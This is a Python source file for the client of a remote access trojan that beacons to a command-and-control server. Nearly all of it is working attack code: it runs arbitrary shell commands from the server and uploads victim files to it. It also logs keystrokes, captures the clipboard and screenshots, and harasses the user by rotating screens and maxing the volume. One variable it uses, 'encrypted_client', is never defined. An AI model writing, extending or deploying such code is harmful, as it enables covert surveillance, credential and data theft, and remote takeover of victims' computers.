from encryption import cipher
from multiprocessing import Process
from PIL import Image, ImageGrab
from pynput.keyboard import Controller, Listener, Key
from pyperclip import paste, PyperclipWindowsException
from pyzipper import AESZipFile, WZ_AES, ZIP_LZMA
from requests import exceptions, get, post, put
from settings import (C2_SERVER, CMD_REQUEST, CWD_RESPONSE, DELAY, FILE_REQUEST, FILE_SEND, HEADER, PORT, PROXY,
                      RESPONSE, RESPONSE_KEY, ZIP_PASSWORD)
from subprocess import PIPE, run, Popen, STDOUT
from time import sleep, time
from os import chdir, getcwd, getenv, path
from rotatescreen import get_displays
from winsound import PlaySound, SND_ASYNC

def run_job(os_command, count):
    try:
        with open(f"Job_{count}.txt", "w") as f_handle:
            process = Popen(os_command, shell=True, stdout=f_handle, stderr=f_handle)
            post_to_server(f"Job_{count} has started with pid: {process.pid}.\nUse the tasklist/taskkill command from"
                           f" windows to manage, if necessary.\nOutput from the job will be saved on the client in "
                           f"Job_{count}.txt.\n")
    except OSError:
        post_to_server(f"An OS Error occurred when attempting to write the job file.\n")

def post_to_server(message: str, response_path=RESPONSE):
    try:
        message = cipher.encrypt(message.encode())
        post(f"http://{C2_SERVER}:{PORT}{response_path}", data={RESPONSE_KEY: message},
             headers=HEADER, proxies=PROXY)
    except exceptions.RequestException:
        return

if __name__ == "__main__":
    def get_filename(input_string):
        output_string = " ".join(input_string.split()[2:]).replace("\\", "/")
        if output_string:
            return output_string
        else:
            post_to_server(f"You must enter a filename after {input_string}.\n")

    def on_press(key_press):
        global key_log
        key_log.append(key_press)

    delay = DELAY
    clip_count = 0
    jobs = []
    job_count = 0
    key_log = []
    listener = None
    shot_count = 0
    client = (getenv("USERNAME", "Unknown_Username") + "@" + getenv("COMPUTERNAME", "Unknown_Computername") + "@" +
              str(time()))

    while True:
        try:
            response = get(f"http://{C2_SERVER}:{PORT}{CMD_REQUEST}{encrypted_client}", headers=HEADER, proxies=PROXY)
            if response.status_code == 404:
                raise exceptions.RequestException
        except exceptions.RequestException:
            sleep(delay)
            continue

        if response.status_code == 204:
            continue

        command = cipher.decrypt(response.content).decode()

        if command.startswith("cd "):
            directory = command[3:]
            try:
                chdir(directory)
            except FileNotFoundError:
                post_to_server(f"{directory} was not found.\n")
            except NotADirectoryError:
                post_to_server(f"{directory} is not a directory.\n")
            except PermissionError:
                post_to_server(f"You do not have permissions to access {directory}.\n")
            except OSError:
                post_to_server("There was an operating system error on the client.\n")
            else:
                post_to_server(getcwd(), CWD_RESPONSE)

        elif not command.startswith("client "):
            if not command.endswith(" &"):
                command_output = run(command, shell=True, stdout=PIPE, stderr=STDOUT).stdout
                post_to_server(command_output.decode())
            else:
                command = command.rstrip(" &")
                jobs.append(Process(target=run_job, args=(command, job_count + 1,)))
                jobs[job_count].start()
                sleep(1)
                job_count += 1

        elif command.startswith("client download"):
            filepath = get_filename(command)
            if filepath is None:
                continue
            filename = path.basename(filepath)
            encrypted_filepath = cipher.encrypt(filepath.encode()).decode()
            try:
                with get(f"http://{C2_SERVER}:{PORT}{FILE_REQUEST}{encrypted_filepath}", stream=True, headers=HEADER,
                         proxies=PROXY) as response:
                    if response.status_code == 200:
                        with open(filename, "wb") as file_handle:
                            file_handle.write(cipher.decrypt(response.content))
                        post_to_server(f"{filename} is now on {client}.\n")
            except OSError:
                post_to_server(f"Unable to write {filename} to disk on {client}.\n")

        elif command.startswith("client upload"):
            filepath = get_filename(command)
            if filepath is None:
                continue
            filename = path.basename(filepath)
            encrypted_filename = cipher.encrypt(filename.encode()).decode()
            try:
                with open(filepath, "rb") as file_handle:
                    encrypted_file = cipher.encrypt(file_handle.read())
                    put(f"http://{C2_SERVER}:{PORT}{FILE_SEND}/{encrypted_filename}", data=encrypted_file,
                        stream=True, proxies=PROXY, headers=HEADER)
            except OSError:
                post_to_server(f"Unable to access {filepath} on {client}.\n")

        elif command.startswith("client zip"):
            filepath = get_filename(command)
            if filepath is None:
                continue
            filename = path.basename(filepath)
            try:
                if path.isdir(filepath):
                    post_to_server(f"{filepath} on {client} is a directory.  Only files can be zipped.\n")
                elif not path.isfile(filepath):
                    raise OSError
                else:
                    with AESZipFile(f"{filepath}.zip", "w", compression=ZIP_LZMA, encryption=WZ_AES) as zip_file:
                        zip_file.setpassword(ZIP_PASSWORD)
                        zip_file.write(filepath, filename)
                        post_to_server(f"{filepath} is now zip-encrypted on {client}.\n")
            except OSError:
                post_to_server(f"Unable to access {filepath} on {client}.\n")

        elif command.startswith("client unzip"):
            filepath = get_filename(command)
            if filepath is None:
                continue
            filename = path.basename(filepath)
            try:
                with AESZipFile(filepath) as zip_file:
                    zip_file.setpassword(ZIP_PASSWORD)
                    zip_file.extractall(path.dirname(filepath))
                    post_to_server(f"{filepath} is now unzipped and decrypted on the client.\n")
            except OSError:
                post_to_server(f"{filepath} was not found on the client.\n")

        elif command == "client kill":
            post_to_server(f"{client} has been killed.\n")
            exit()

        elif command.startswith("client delay"):
            try:
                delay = float(command.split()[2])
                if delay < 0:
                    raise ValueError
            except (IndexError, ValueError):
                post_to_server("You must enter in a positive number in seconds for the delay.\n")
            else:
                post_to_server(f"{client} is now configured for a {delay} second delay when set inactive.\n")

        elif command == "client get clipboard":
            clip_count += 1
            with open(f"clipboard_{clip_count}.txt", "w") as file_handle:
                try:
                    file_handle.write(paste())
                except PyperclipWindowsException:
                    post_to_server(f"The computer is currently locked.  Can not get clipboard now.\n")
                except OSError:
                    post_to_server(f"There was an OS error when writing the clipboard data to disk.\n")
                else:
                    post_to_server(f"clipboard_{clip_count}.txt has been saved.\n")

        elif command == "client keylog on":
            if listener is None:
                listener = Listener(on_press=on_press)
                listener.start()
                post_to_server("A keylogger is now running on the client.\n")
            else:
                post_to_server("A keylogger is already running on the client.\n")

        elif command == "client keylog off":
            if listener is not None:
                listener.stop()
                try:
                    with open("Keys.log", "a") as file_handle:
                        for a_key_press in key_log:
                            file_handle.write(str(a_key_press).replace("Key.enter", "\n")
                                              .replace("'", "").replace("Key.space", " ")
                                              .replace('""', "'").replace("Key.shift_r", "")
                                              .replace("Key.shift_l", ""))
                        key_log.clear()
                        listener = None
                        post_to_server("Key logging is now disabled on the client. Results are in Keys.log\n")
                except OSError:
                    post_to_server("An OS error occurred while writing key log data to disk.\n")
            else:
                post_to_server("Key logging is not enabled on the client.\n")

        elif command.startswith("client type"):
            keyboard = None
            try:
                text = " ".join(command.split()[2:])
                keyboard = Controller()
                keyboard.type(text)
                post_to_server(f"Your message was typed on the client's keyboard.\n")
            except IndexError:
                post_to_server(f"You must enter some text to type on the client.\n")
            except keyboard.InvalidCharacterException:
                post_to_server(f"A non-typeable character was encountered.\n")

        elif command == "client screenshot":
            shot_count += 1
            screenshot = ImageGrab.grab(all_screens=True)
            screenshot.save(f"screenshot_{shot_count}.png")
            post_to_server(f"screenshot_{shot_count}.png has been saved.\n")

        elif command.startswith("client display"):
            filepath = get_filename(command)
            if filepath is None:
                continue
            try:
                image = Image.open(filepath)
                image.show()
                post_to_server(f"{filepath} is now displaying on the client.\n")
            except OSError:
                post_to_server(f"Unable to display {filepath} on {client}.\n")

        elif command == "client flip screen" or command == "client flip":
            screens = get_displays()
            for screen in screens:
                start_pos = screen.current_orientation
                screen.rotate_to(abs((start_pos - 180) % 360))

        elif command == "client roll screen" or command == "client roll":
            screens = get_displays()
            for screen in screens:
                start_pos = screen.current_orientation
                for i in range(1, 9):
                    pos = abs((start_pos - i * 90) % 360)
                    screen.rotate_to(pos)
                    sleep(1.5)

        elif command == "client max volume" or command == "client max":
            keyboard = Controller()
            for i in range(50):
                keyboard.press(Key.media_volume_up)
                keyboard.release(Key.media_volume_up)

        elif command.startswith("client play"):
            filepath = get_filename(command)
            if filepath is None:
                continue
            try:
                if path.isfile(filepath) and filepath.lower().endswith(".wav"):
                    PlaySound(filepath, SND_ASYNC)
                    post_to_server(f"{filepath} is now playing on the client.\n")
                else:
                    post_to_server(f"{filepath} was not found or the file doesn't end in .wav.\n")
            except OSError:
                post_to_server(f"Accessing {filepath} caused an OS error.\n")
